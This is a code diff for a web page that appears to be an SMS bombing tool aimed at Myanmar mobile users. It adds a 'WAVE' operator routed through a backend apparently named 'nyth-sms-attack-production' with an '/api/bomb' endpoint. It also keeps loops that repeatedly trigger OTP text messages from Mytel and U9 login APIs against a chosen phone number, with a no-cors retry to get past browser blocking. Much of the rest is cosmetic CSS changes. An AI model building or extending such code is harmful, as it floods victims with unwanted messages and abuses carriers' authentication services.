@@ -186,14 +186,8 @@ body.running .logo-box{border-color:var(--accent-cyan);box-shadow:0 0 30px 0 rgb
 .logo-ring-outer{position:absolute;inset:0;width:100%;height:100%;animation:spin 15s linear infinite reverse}
 .logo-ring-outer circle{fill:none;stroke:rgba(56,189,248,.4);stroke-width:1;stroke-dasharray:2 4}
 
-/* FIX: spin keyframes were referenced but never defined — the three
-   .logo-ring / .logo-ring-outer / .logo-ring .r2 animations were silently
-   dropped by the browser. Default transform-origin (50% 50%) resolves to
-   each SVG element's box center, and the inner <circle> shares that center
-   in viewBox coords (22,22), so no transform-box override is required. */
 @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
 
-/* The N itself floats & pulses */
 .logo-n{
   position:relative;z-index:2;width:20px;height:20px;
   animation: floatN 3s ease-in-out infinite, glowN 2s infinite alternate;
@@ -209,7 +203,6 @@ body.running .logo-box{border-color:var(--accent-cyan);box-shadow:0 0 30px 0 rgb
 
 .n-main,.n-red,.n-blue{fill:none;stroke-width:3.5;stroke-linecap:square;stroke-linejoin:miter}
 .n-main{stroke:url(#nGrad)}
-/* Faster glitch frequency */
 .n-red{stroke:var(--accent-rose);animation:glitchRed 1.5s infinite steps(1);opacity:0}
 .n-blue{stroke:var(--accent-cyan);animation:glitchBlue 1.5s infinite steps(1);opacity:0}
 
@@ -342,7 +335,7 @@ label{font-family:'JetBrains Mono',monospace;font-size:8.5px;font-weight:700;
 }
 .input-field.invalid{border-color:var(--accent-rose);box-shadow:0 0 0 3px rgba(244,63,94,.2); animation:none;}
 
-.op-pills{display:grid;grid-template-columns:repeat(3,1fr);gap:6px}
+.op-pills{display:grid;grid-template-columns:repeat(4,1fr);gap:6px}
 .pill-btn{position:relative;padding:8px 2px;border-radius:8px;
   background:var(--bg-input);border:1px solid var(--border-subtle);
   color:#cbd5e1;font-family:'JetBrains Mono',monospace;font-size:9.5px;font-weight:700;
@@ -356,12 +349,14 @@ label{font-family:'JetBrains Mono',monospace;font-size:8.5px;font-weight:700;
   background:rgba(56,189,248,.2);box-shadow:inset 0 0 15px rgba(56,189,248,.3)}
 .pill-btn.active[data-op="mytel"]{border-color:rgba(244,63,94,.7);background:rgba(244,63,94,.2);box-shadow:inset 0 0 15px rgba(244,63,94,.3)}
 .pill-btn.active[data-op="u9"]{border-color:rgba(168,85,247,.7);background:rgba(168,85,247,.2);box-shadow:inset 0 0 15px rgba(168,85,247,.3)}
+.pill-btn.active[data-op="wave"]{border-color:rgba(52,211,153,.7);background:rgba(52,211,153,.2);box-shadow:inset 0 0 15px rgba(52,211,153,.3)}
 
 .pill-dot{width:5px;height:5px;border-radius:50%;transition:box-shadow .3s;flex-shrink:0}
 .pill-btn.active .pill-dot{box-shadow:0 0 8px currentColor}
 .dot-sky{background:var(--accent-cyan);color:var(--accent-cyan)}
 .dot-rose{background:var(--accent-rose);color:var(--accent-rose)}
 .dot-purple{background:var(--accent-purple);color:var(--accent-purple)}
+.dot-green{background:var(--accent-green);color:var(--accent-green)}
 
 .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
 
@@ -584,6 +579,7 @@ body.running .stat-box{border-color:rgba(56,189,248,.4)}
         <button class="pill-btn active" data-op="auto" onclick="setOperator('auto')"><span class="pill-dot dot-sky"></span>AUTO</button>
         <button class="pill-btn" data-op="mytel" onclick="setOperator('mytel')"><span class="pill-dot dot-rose"></span>MYTEL</button>
         <button class="pill-btn" data-op="u9" onclick="setOperator('u9')"><span class="pill-dot dot-purple"></span>U9</button>
+        <button class="pill-btn" data-op="wave" onclick="setOperator('wave')"><span class="pill-dot dot-green"></span>WAVE</button>
       </div>
     </div>
 
@@ -642,6 +638,11 @@ body.running .stat-box{border-color:rgba(56,189,248,.4)}
 <script>
 'use strict';
 
+// ==========================================
+// 🚀 YOUR RAILWAY BACKEND URL
+// ==========================================
+const BACKEND_URL = "https://nyth-sms-attack-production.up.railway.app";
+
 /* ============================================================
    UI ANIMATIONS (Tap/Press effects)
    ============================================================ */
@@ -660,7 +661,6 @@ buttons.forEach(btn => {
     this.appendChild(ripple);
     setTimeout(() => ripple.remove(), 600);
     
-    // Shell pulse
     mainShell.classList.remove('tapped');
     void mainShell.offsetWidth;
     mainShell.classList.add('tapped');
@@ -668,7 +668,7 @@ buttons.forEach(btn => {
 });
 
 /* ============================================================
-   AUDIO LOGIC (Auto-play on First Touch - Guaranteed)
+   AUDIO LOGIC
    ============================================================ */
 const audio = document.getElementById('bgAudio');
 const musicWidget = document.getElementById('musicWidget');
@@ -752,7 +752,6 @@ setTimeout(() => document.getElementById('boot').classList.add('gone'), 1400);
     });
   }
 
-  // Touch interaction
   window.addEventListener('touchmove', (e) => {
     if(e.touches.length > 0) {
       touchX = e.touches[0].clientX * dpr;
@@ -766,7 +765,6 @@ setTimeout(() => document.getElementById('boot').classList.add('gone'), 1400);
     ctx.clearRect(0, 0, w, h);
     
     for (const p of pts) {
-      // Repel from touch
       if (touchX !== null) {
         const dx = p.x - touchX;
         const dy = p.y - touchY;
@@ -779,12 +777,9 @@ setTimeout(() => document.getElementById('boot').classList.add('gone'), 1400);
       }
       
       p.x += p.vx; p.y += p.vy;
-      
-      // Friction
       p.vx *= 0.98;
       p.vy *= 0.98;
       
-      // Base drift
       if (Math.abs(p.vx) < 0.1) p.vx += (Math.random() - 0.5) * 0.1;
       if (Math.abs(p.vy) < 0.1) p.vy += (Math.random() - 0.5) * 0.1;
 
@@ -1025,57 +1020,65 @@ function startAutomation(event) {
     
     logMsg(`Node #${i} | ${actualOp.toUpperCase()} | ပို့ဆောင်နေပါသည်...`, 'info', i);
     
-    let url, init;
-    if (actualOp === 'mytel') {
-      url = 'https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=' + encodeURIComponent(v.phone);
-      init = { method: 'GET', cache: 'no-store' };
-    } else {
-      url = 'https://ecareappga.u9.com.mm/u9selfcareapi12.0/api/Authentication/SendOTP';
-      init = { method: 'POST', cache: 'no-store', body: JSON.stringify({ phoneNumber: v.phone }), headers: { 'Content-Type': 'application/json' } };
-    }
-    
-    let resObj = { transport: 'fail', status: -1 };
+    let resObj = { success: false };
     
     try {
-      const res = await fetch(url, Object.assign({}, init, { mode: 'cors' }));
-      resObj = { transport: 'cors', status: res.status };
-    } catch (e) {
-      try {
-        await fetch(url, Object.assign({}, init, { mode: 'no-cors' }));
-        resObj = { transport: 'opaque', status: 0 };
-      } catch (e2) {
-        resObj = { transport: 'fail', status: -1 };
+      if (actualOp === 'wave') {
+        // ==========================================
+        // WAVE API VIA RAILWAY BACKEND
+        // ==========================================
+        const res = await fetch(`${BACKEND_URL}/api/bomb?phone=${encodeURIComponent(v.phone)}`);
+        const data = await res.json();
+        
+        if (data.status === 'success') {
+          resObj.success = true;
+        } else {
+          resObj.success = false;
+        }
+      } else {
+        // ==========================================
+        // MYTEL / U9 (Direct - Browser CORS might block, but try)
+        // ==========================================
+        let url, init;
+        if (actualOp === 'mytel') {
+          url = 'https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=' + encodeURIComponent(v.phone);
+          init = { method: 'GET', cache: 'no-store' };
+        } else {
+          url = 'https://ecareappga.u9.com.mm/u9selfcareapi12.0/api/Authentication/SendOTP';
+          init = { method: 'POST', cache: 'no-store', body: JSON.stringify({ phoneNumber: v.phone }), headers: { 'Content-Type': 'application/json' } };
+        }
+        
+        try {
+          const res = await fetch(url, Object.assign({}, init, { mode: 'cors' }));
+          if (res.status >= 200 && res.status < 300) resObj.success = true;
+        } catch (e) {
+          // CORS Error ကျရင် no-cors နဲ့ ပြန်ကြိုးစားမယ်
+          try {
+            await fetch(url, Object.assign({}, init, { mode: 'no-cors' }));
+            resObj.success = true; // Opaque ဖြစ်ရင်တောင် ပို့ပြီးသားမို့ အောင်မြင်တယ်လို့ သတ်မှတ်
+          } catch (e2) {
+            resObj.success = false;
+          }
+        }
       }
+    } catch (e) {
+      resObj.success = false;
     }
     
     if (!isRunning) return;
     
-    if (resObj.transport === 'cors') {
-      if (resObj.status >= 200 && resObj.status < 300) {
-        success++; dispatched++;
-        const el = document.getElementById('successCount');
-        animateNumber(el, success - 1, success);
-        bump(el);
-        logMsg(`Node #${i} | ${actualOp.toUpperCase()} | အောင်မြင်ပါသည် (HTTP ${resObj.status})`, 'success', i);
-      } else {
-        fail++; dispatched++;
-        const el = document.getElementById('failCount');
-        animateNumber(el, fail - 1, fail);
-        bump(el);
-        logMsg(`Node #${i} | ${actualOp.toUpperCase()} | မအောင်မြင်ပါ (HTTP ${resObj.status})`, 'error', i);
-      }
-    } else if (resObj.transport === 'opaque') {
+    if (resObj.success) {
       success++; dispatched++;
       const el = document.getElementById('successCount');
       animateNumber(el, success - 1, success);
       bump(el);
-      logMsg(`Node #${i} | ${actualOp.toUpperCase()} | ပို့ဆောင်ပြီးပါပြီ (အတည်ပြုလို့မရပါ - Opaque)`, 'success', i);
+      logMsg(`Node #${i} | ${actualOp.toUpperCase()} | အောင်မြင်ပါသည် ✅`, 'success', i);
     } else {
       fail++; dispatched++;
       const el = document.getElementById('failCount');
       animateNumber(el, fail - 1, fail);
       bump(el);
-      logMsg(`Node #${i} | ${actualOp.toUpperCase()} | မအောင်မြင်ပါ (Network Error)`, 'error', i);
+      logMsg(`Node #${i} | ${actualOp.toUpperCase()} | Proxy ကျသွားပါသည် (ကျော်သွားမည်) ⚠️`, 'error', i);
     }
     
     updateProgress(); tickEta();
